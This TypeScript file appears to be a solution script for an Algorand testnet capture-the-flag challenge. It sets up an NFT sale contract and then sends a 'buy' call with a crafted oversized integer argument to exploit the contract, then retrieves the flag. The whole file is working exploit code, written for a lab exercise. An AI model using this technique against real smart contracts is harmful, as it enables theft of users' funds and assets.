import algosdk from 'algosdk';
import { Buffer } from 'buffer';
import {unsealMessageFromNote} from 'algosms'


let account = algosdk.generateAccount();

const ALGONODE_TOKEN = 'no token required';
const ALGONODE_SERVER = 'https://testnet-api.algonode.cloud';
const ALGONODE_PORT = '443';

const client = new algosdk.Algodv2(
  ALGONODE_TOKEN,
  ALGONODE_SERVER,
  ALGONODE_PORT
);

let indexerClient = new algosdk.Indexer({}, "https://testnet-idx.algonode.cloud", "443")


let postTransaction = async (txns: algosdk.Transaction[], client: algosdk.Algodv2) => {
    //const connector = getConnector();
    algosdk.assignGroupID(txns);
    let txIds = txns.map(txn => {return txn.txID.toString()})

    const decodedResult = txns.map(txn => {
        return txn.signTxn(account.sk);
    });
    decodedResult.forEach((dR, i) => { 
        const signedTxn = algosdk.decodeSignedTransaction(dR!)
        const s_txn = (signedTxn.txn as unknown) as algosdk.Transaction;
        txIds[i] = s_txn.txID();
    });
    
    
    const acTx = await client.sendRawTransaction(decodedResult).do();

    // Wait for transaction to be confirmed
    let confirmedTxn = await algosdk.waitForConfirmation(client, acTx.txId, 4);
    //Get the completed Transaction
    console.log("Transaction " + acTx.txId + " confirmed in round " + confirmedTxn["confirmed-round"]);
    
    // display results for loop for prommise where !order_matter
    let id = -1;

    await Promise.all(txIds.map(async (txId) => {
        let transactionResponse = await client.pendingTransactionInformation(txId).do();
        if (transactionResponse['application-index'] != null)
        {
            id = transactionResponse['application-index'];
        }
        if (transactionResponse["asset-index"] != null) {
            id = transactionResponse["asset-index"];
        }
    }));
    return {txid: acTx.txId, id: id}
}

let deploy = async() => {
    // Wait to get funds from faucet
    const CTF_ADDRESS = "" // Replace with your CTF address
    const APP_INDEX = 0 // Replace with your app index
    let APP_ADDRESS = algosdk.getApplicationAddress(APP_INDEX)
    let params = await client.getTransactionParams().do();

    console.log("Waiting for funds from faucet for address " + account.addr + " ...")
    while (true) {
        let accountInfo = await client.accountInformation(account.addr).do();
        if (accountInfo.amount > 0) {
            break;
        }
        await sleep(1000);
    }
    
    console.log("Running Exploit:")

    // OptIn
    const optInTx = algosdk.makeApplicationCallTxnFromObject({
        from: account.addr,
        appIndex: APP_INDEX,
        onComplete: algosdk.OnApplicationComplete.OptInOC,
        appArgs:  [],
        foreignApps: [],
        foreignAssets: [],
        suggestedParams: params,
    })
    console.log("Opting In To Application...")
    await postTransaction([optInTx], client)

    // Create NFT
    console.log("Creating NFT...")
    const nftTxn = algosdk.makeAssetCreateTxnWithSuggestedParams(account.addr, undefined, 1, undefined, undefined, undefined, undefined, undefined, undefined, undefined, undefined, undefined, undefined, params)
    let tx_result2 = await postTransaction([nftTxn], client)
    let nftID = tx_result2.id
    console.log("NFT created with id:", nftID)

    // Setup Contract
    console.log("Funding contract...")
    let transactions: algosdk.Transaction[] = []
    const fundAppTxn = algosdk.makePaymentTxnWithSuggestedParams(account.addr, APP_ADDRESS, 1000000, undefined, undefined, params)    
    
    const setupTxn = algosdk.makeApplicationCallTxnFromObject({
        from: account.addr,
        appIndex: APP_INDEX,
        onComplete: algosdk.OnApplicationComplete.NoOpOC,
        appArgs:  [new TextEncoder().encode("setup"), algosdk.bigIntToBytes(Date.now() + 1 * 24 * 60 * 60 * 1000, 8),],
        foreignApps: [nftID],
        foreignAssets: [nftID],
        suggestedParams: params,
    })

    const xferNFTTxn = algosdk.makeAssetTransferTxnWithSuggestedParams(account.addr, APP_ADDRESS, undefined, undefined, 1, undefined, nftID, params, undefined )
    transactions.push(...[fundAppTxn, setupTxn, xferNFTTxn])
    
    await postTransaction(transactions, client)
    
    console.log("Exploiting Contract...")
    const fakePurchase = algosdk.makePaymentTxnWithSuggestedParams(account.addr, APP_ADDRESS, 1000000, undefined, undefined, params)    
    const updateTxn = algosdk.makeApplicationCallTxnFromObject({
        from: account.addr,
        appIndex: APP_INDEX,
        onComplete: algosdk.OnApplicationComplete.NoOpOC,
        appArgs: [new TextEncoder().encode("buy"), algosdk.bigIntToBytes(0x8000000000000000, 8)],
        foreignApps: [nftID],
        foreignAssets: [nftID],
        suggestedParams: params,
    })
    let txid = await postTransaction([fakePurchase, updateTxn], client)

    console.log("Exploit Likely Succeeded...", txid.txid)

    // Send Funds to flag account
    console.log("Sending funds to flag account...")
    const flagTxn = algosdk.makePaymentTxnWithSuggestedParams(account.addr, CTF_ADDRESS, 1000000, undefined, undefined, params)
    await postTransaction([flagTxn], client)
    while (true) {
        let transactions = await indexerClient.searchForTransactions().address(account.addr).do();
        let lastTx = transactions.transactions[0];
        if (lastTx.sender == CTF_ADDRESS) {
            const note = Buffer.from(lastTx.note, 'base64');
            const msg = unsealMessageFromNote(note, CTF_ADDRESS, account);
            console.log("Flag:", msg.msg);
            break;
        }
        await sleep(1000);
    }
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

deploy()
